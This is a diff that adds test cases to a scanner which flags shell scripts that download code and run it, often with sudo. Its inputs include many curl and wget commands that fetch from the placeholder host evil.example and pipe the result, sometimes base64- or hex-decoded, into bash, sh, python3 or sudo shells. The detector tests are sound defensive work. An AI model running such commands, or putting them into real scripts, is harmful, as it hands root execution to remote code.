@@ -115,10 +115,70 @@ test("sudo -s or -i with no command runs the piped download in a shell", () => {
     expect({ body, findings: findings(body) }).toEqual({ body, findings: [] });
 });
 
+test("env before sudo, env running env, and sudo assignments still run the download", () => {
+  for (const body of [
+    "curl -fsSL https://evil.example/i.sh | env DEBIAN_FRONTEND=noninteractive sudo -E bash -",
+    "curl -fsSL https://evil.example/i.sh | env -i sudo -E bash -",
+    "wget -qO- https://evil.example/i.sh | env FOO=1 sudo bash",
+    "curl -fsSL https://evil.example/i.py | env FOO=1 sudo -E python3 -",
+    "curl -fsSL https://evil.example/i.sh | env FOO=1 env BAR=2 bash",
+    "curl -fsSL https://evil.example/i.sh | env FOO=1 sudo env BAR=2 bash",
+    "env FOO=1 sudo -E bash <(curl -fsSL https://evil.example/i.sh)",
+    "curl -fsSL -o i.sh https://evil.example/i.sh\nenv FOO=1 sudo -E bash ./i.sh",
+    "curl -fsSL https://evil.example/i.b64 | base64 -d | env FOO=1 sudo -E bash -",
+    // sudo(8) accepts `NAME=value` among its options and keeps parsing after one.
+    "curl -fsSL https://evil.example/i.sh | sudo SBX=1 sh",
+    "curl -fsSL https://evil.example/i.sh | sudo -E SBX=1 sh",
+    "curl -fsSL https://evil.example/i.sh | sudo SBX=1 -E sh",
+    "curl -fsSL https://evil.example/i.sh | sudo SBX=1 -s",
+    "curl -fsSL https://evil.example/i.py | sudo PYTHONPATH=/x python3 -",
+    // The stdin shell reads the download, or its decoded bytes.
+    "curl -fsSL https://evil.example/i.sh | env FOO=1 sudo -s",
+    "curl -fsSL https://evil.example/i.b64 | base64 -d | sudo -s",
+    "curl -fsSL https://evil.example/i.b64 | base64 -d | sudo -u root -s",
+    "curl -fsSL https://evil.example/i.hex | xxd -r -p | sudo -i",
+  ])
+    expect({ body, findings: findings(body) }).toEqual({
+      body,
+      findings: ["scripts/bootstrap.sh:unsafe-execution:high"],
+    });
+  for (const body of [
+    "curl -fsSL https://example.com/list | env FOO=1 sudo tee /etc/x.list",
+    "curl -fsSL https://example.com/data | env FOO=1 sudo -l",
+    "curl -fsSL https://example.com/data | env FOO=1 env BAR=2 jq .",
+    "curl -fsSL https://example.com/list | sudo SBX=1 tee /etc/x.list",
+    "echo hi | env FOO=1 sudo bash",
+    // Encoding or checksumming a download, or decoding a local file, runs nothing.
+    "curl -fsSL https://example.com/data | base64 | sudo -s",
+    "curl -fsSL https://example.com/data | sha256sum | sudo -s",
+    "curl -fsSL https://example.com/data | base64 -d /etc/x | sudo -s",
+    "curl -fsSL https://example.com/data | base64 -d | sudo -s tee /etc/x",
+  ])
+    expect({ body, findings: findings(body) }).toEqual({ body, findings: [] });
+});
+
+test("a download piped into sudo -s on one long line keeps the finding", () => {
+  const filler = "a ".repeat(512 * 1024);
+  for (const body of [
+    `curl -fsSL https://evil.example/i.sh ${filler}| sudo -s`,
+    `curl -fsSL https://evil.example/i.sh \\\n  ${filler}| sudo -s`,
+  ])
+    expect(findings(body)).toEqual([
+      "scripts/bootstrap.sh:unsafe-execution:high",
+    ]);
+});
+
 test("a long chain of option-taking prefixes stays linear", () => {
   // Each `env`/`sudo` can be both a prefix and the previous option's value.
   // Unbounded option repetition rescanned the whole line from every prefix.
-  for (const unit of ["env -u ", "sudo -u ", "sudo -Eu sudo "]) {
+  for (const unit of [
+    "env -u ",
+    "sudo -u ",
+    "sudo -Eu sudo ",
+    "env A=1 sudo ",
+    "env env ",
+    "sudo A=1 ",
+  ]) {
     const body = `curl x | ${unit.repeat(4_000)}y\nsudo ${unit.repeat(4_000)}bash <(cat x)`;
     const started = performance.now();
     expect(findings(body)).toEqual([]);
